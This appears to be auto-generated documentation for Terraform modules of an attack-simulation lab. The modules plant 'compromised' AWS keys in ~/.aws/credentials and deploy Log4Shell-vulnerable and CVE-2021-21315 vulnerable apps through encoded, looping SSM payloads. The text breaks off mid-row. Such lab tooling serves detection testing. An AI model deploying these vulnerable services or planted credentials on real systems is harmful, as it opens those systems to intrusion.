| target-aws-credentials                                                     | ./modules/ssm/deploy-aws-credentials                           | ssm_deploy_secret_aws_credentials          | context.aws.ssm.aws_credentials                                           | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "aws_credentials": {<br/>                    "compromised_keys_user": null,<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-aws-credentials                           | <pre>locals &&#35;123;<br/>    tool = &quot;aws&quot;<br/>    aws&&#35;95;creds = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for u,k in var&#46;inputs&&#35;91;&quot;compromised&&#35;95;credentials&quot;&&#35;93;: &quot;$&&#35;123;k&#46;rendered&&#35;125;&quot; &&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;Setting up aws cred environment variables&#46;&#46;&#46;&quot;<br/>    $&&#35;123;local&#46;aws&&#35;95;creds&&#35;125;<br/>    log &quot;Deploying aws credentials&#46;&#46;&#46;&quot;<br/>    mkdir &#45;p ~/&#46;aws<br/>    cat &lt;&lt;&#45;EOF &gt; ~/&#46;aws/credentials<br/>    &&#35;91;default&&#35;93;<br/>    aws&&#35;95;access&&#35;95;key&&#35;95;id=$AWS&&#35;95;ACCESS&&#35;95;KEY&&#35;95;ID<br/>    aws&&#35;95;secret&&#35;95;access&&#35;95;key=$AWS&&#35;95;SECRET&&#35;95;ACCESS&&#35;95;KEY<br/>    EOF<br/>    cat &lt;&lt;&#45;EOF &gt; ~/&#46;aws/config<br/>    &&#35;91;default&&#35;93;<br/>    region=$AWS&&#35;95;DEFAULT&&#35;95;REGION<br/>    output=json<br/>    EOF<br/>    log &quot;Running: aws get&#45;caller&#45;identity&quot;<br/>    aws sts get&#45;caller&#45;identity &#45;&#45;output json &gt;&gt; $LOGFILE 2&gt;&amp;1 <br/>    EOT<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found &#45; waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &amp;&gt;/dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found &#45; waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| target-vulnerable-docker-log4j-app                                         | ./modules/ssm/deploy-docker-log4j-app                          | ssm_deploy_docker_log4j_app                | context.aws.ssm.vulnerable.docker.log4j_app                               | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "docker": {<br/>                        "log4j_app": {<br/>                            "enabled": false,<br/>                            "listen_port": 8000<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker-log4j-app                          | <pre>locals &&#35;123;<br/>    image = &quot;ghcr&#46;io/christophetd/log4shell&#45;vulnerable&#45;app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929&quot;<br/>    name = &quot;log4shell&quot;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        if &&#35;91;&&#35;91; &&#35;96;sudo docker ps &#124; grep $&&#35;123;local&#46;name&&#35;125;&&#35;96; &&#35;93;&&#35;93;; then docker stop $&&#35;123;local&#46;name&&#35;125;; fi<br/>        log &quot;$&&#35;40;echo &&#35;x27;docker run &#45;d &#45;&#45;name $&&#35;123;local&#46;name&&#35;125; &#45;v /tmp:/tmp &#45;&#45;rm &#45;p $&&#35;123;local&#46;listen&&#35;95;port&&#35;125;:8080 $&&#35;123;local&#46;image&&#35;125;&&#35;x27;&&#35;41;&quot;<br/>        docker run &#45;d &#45;&#45;name $&&#35;123;local&#46;name&&#35;125; &#45;v /tmp:/tmp &#45;&#45;rm &#45;p $&&#35;123;local&#46;listen&&#35;95;port&&#35;125;:8080 $&&#35;123;local&#46;image&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        docker ps &#45;a &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;curl&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;curl&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| target-vulnerable-log4j-app                                                | ./modules/ssm/deploy-log4j-app                                 | ssm_deploy_log4j_app                       | context.aws.ssm.vulnerable.log4j_app                                      | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "log4j_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8080<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-log4j-app                                 | <pre>locals &&#35;123;<br/>    app&&#35;95;dir = &quot;/vuln&#45;log4j&#45;app&quot;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;X quit<br/>    screen &#45;wipe<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;log4j&&#35;95;app&&#35;95;target&#46;log<br/>    <br/>    rm &#45;rf $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/>    mkdir $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/><br/>    log &quot;creating local files&#46;&#46;&#46;&quot;<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;web&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; web&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;ldap&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip  &gt; ldap&#46;py<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;requirements&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; requirements&#46;txt<br/><br/>    &#35; install java 8u131<br/>    log &quot;checking for jdk1&#46;8&#46;0&&#35;95;131&#46;&#46;&#46;&quot;<br/>    if &&#35;91; &#33; &#45;d /usr/java/jdk1&#46;8&#46;0&&#35;95;131/ &&#35;93;; then<br/>        log &quot;jdk1&#46;8&#46;0&&#35;95;131 not found &#45; installing&#46;&#46;&#46;&quot;<br/>        wget &#45;c &#45;&#45;header &quot;Cookie: oraclelicense=accept&#45;securebackup&#45;cookie&quot; http://download&#46;oracle&#46;com/otn&#45;pub/java/jdk/8u131&#45;b11/d54c1d3a095b4ff2b6607d096fa80163/jdk&#45;8u131&#45;linux&#45;x64&#46;tar&#46;gz<br/>        mkdir &#45;p /usr/java<br/>        sudo tar &#45;xvzf jdk&#45;8u131&#45;linux&#45;x64&#46;tar&#46;gz &#45;C /usr/java<br/>    else<br/>        log &quot;jdk1&#46;8&#46;0&&#35;95;131 found &#45; skipping install&quot;<br/>    fi<br/>    <br/><br/>    &#35; update java path<br/>    log &quot;setting up java environment for build&#46;&#46;&#46;&quot;<br/>    export JAVA&&#35;95;HOME=/usr/java/jdk1&#46;8&#46;0&&#35;95;131/<br/>    sudo update&#45;alternatives &#45;&#45;install /usr/bin/java java $$&&#35;123;JAVA&&#35;95;HOME%&&#35;42;/&&#35;125;/bin/java 20000<br/>    sudo update&#45;alternatives &#45;&#45;install /usr/bin/javac javac $$&&#35;123;JAVA&&#35;95;HOME%&&#35;42;/&&#35;125;/bin/javac 20000<br/>    <br/>    java &#45;version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &#35; download gradle 7&#46;3&#46;1<br/>    log &quot;checking for gradle 7&#46;3&#46;1&#46;&#46;&#46;&quot;<br/>    if &&#35;91; &#33; &#45;d /opt/gradle/gradle&#45;7&#46;3&#46;1 &&#35;93;; then<br/>        log &quot;gradle not found &#45; installing&#46;&#46;&#46;&quot;<br/>        wget https://services&#46;gradle&#46;org/distributions/gradle&#45;7&#46;3&#46;1&#45;bin&#46;zip<br/>        mkdir /opt/gradle<br/>        unzip &#45;d /opt/gradle gradle&#45;7&#46;3&#46;1&#45;bin&#46;zip<br/>    else<br/>        log &quot;gradle 7&#46;3&#46;1 found &#45; skipping install&quot; <br/>    fi<br/><br/>    &#35; update gradle path<br/>    log &quot;updating environment PATH to include gradle&#46;&#46;&#46;&quot;<br/>    export PATH=$PATH:/opt/gradle/gradle&#45;7&#46;3&#46;1/bin<br/>    gradle &#45;&#45;version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &#35; clone the log4shell vulnerable app<br/>    log &quot;cloning https://github&#46;com/christophetd/log4shell&#45;vulnerable&#45;app&#46;&#46;&#46;&quot;<br/>    git clone https://github&#46;com/christophetd/log4shell&#45;vulnerable&#45;app<br/>    cd log4shell&#45;vulnerable&#45;app<br/>    log &quot;running gradle build&#46;&#46;&#46;&quot;<br/>    nohup gradle bootJar &#45;&#45;no&#45;daemon &amp;<br/>    GRADLE&&#35;95;PID=$&#33;<br/>    while kill &#45;0 $GRADLE&&#35;95;PID 2&gt; /dev/null; do<br/>        log &quot;Process is still running&#46;&#46;&#46;&quot;<br/>        sleep 30<br/>    done<br/>    log &quot;gradle build complete&#46;&quot;<br/>    <br/>    ls &#45;ltr build/libs/&&#35;42;&#46;jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    &#35; copy java jar<br/>    log &quot;Copying java jar&#46;&#46;&quot;<br/>    cp build/libs/log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;/log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    <br/>    &#35; change to app root dir<br/>    cd $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;<br/><br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        if pgrep &#45;f &quot;log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar&quot;; then<br/>            kill &#45;9 $&&#35;40;pgrep &#45;f &quot;log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar&quot;&&#35;41;<br/>        fi<br/>        screen &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;X quit<br/>        screen &#45;wipe<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/vuln&&#35;95;log4j&&#35;95;app&&#35;95;target&#46;log &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;m java &#45;jar $&&#35;123;local&#46;app&&#35;95;dir&&#35;125;/log4shell&#45;vulnerable&#45;app&#45;0&#46;0&#46;1&#45;SNAPSHOT&#46;jar &#45;&#45;server&#46;port=$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125;<br/>        screen &#45;S vuln&&#35;95;log4j&&#35;95;app&&#35;95;target &#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl unzip git&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl unzip git&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    web = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/web&#46;py&quot;,<br/>                        &&#35;41;<br/><br/>    ldap = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/ldap&#46;py&quot;,<br/>                        &&#35;41;<br/>    requirements = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/requirements&#46;txt&quot;,<br/>                        &&#35;41;<br/>    <br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| target-vulnerable-npm-app                                                  | ./modules/ssm/deploy-npm-app                                   | ssm_deploy_npm_app                         | context.aws.ssm.vulnerable.npm_app                                        | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "npm_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8089<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-npm-app                                   | <pre>locals &&#35;123;<br/>    repo = &quot;https://github&#46;com/ForbiddenProgrammer/CVE&#45;2021&#45;21315&#45;PoC&quot;<br/>    listen&&#35;95;port=var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    screen &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;X quit<br/>    truncate &#45;s 0 /tmp/vuln&&#35;95;npm&&#35;95;app&&#35;95;target&#46;log<br/>    log &quot;checking for git&#46;&#46;&#46;&quot;<br/>    while &#33; command &#45;v git; do<br/>        log &quot;git not found &#45; waiting&quot;<br/>        sleep 10<br/>    done<br/>    log &quot;git: $&&#35;40;command &#45;v  git&&#35;41;&quot;<br/>    rm &#45;rf /vuln&&#35;95;npm&&#35;95;app&&#35;95;target &amp;&amp; &&#35;92;<br/>    mkdir /vuln&&#35;95;npm&&#35;95;app&&#35;95;target &amp;&amp; &&#35;92;<br/>    cd /vuln&&#35;95;npm&&#35;95;app&&#35;95;target &amp;&amp; &&#35;92;<br/>    git clone $&&#35;123;local&#46;repo&&#35;125; &amp;&amp; &&#35;92;<br/>    cd CVE&#45;2021&#45;21315&#45;PoC &amp;&amp; &&#35;92;<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;index&&#35;95;js&&#35;95;base64&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; index&#46;js<br/>    npm install &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;X quit<br/>        screen &#45;wipe<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/vuln&&#35;95;npm&&#35;95;app&&#35;95;target&#46;log &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;m npm start &#45;&#45;prefix /vuln&&#35;95;npm&&#35;95;app&&#35;95;target/CVE&#45;2021&#45;21315&#45;PoC<br/>        screen &#45;S vuln&&#35;95;npm&&#35;95;app&&#35;95;target &#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = 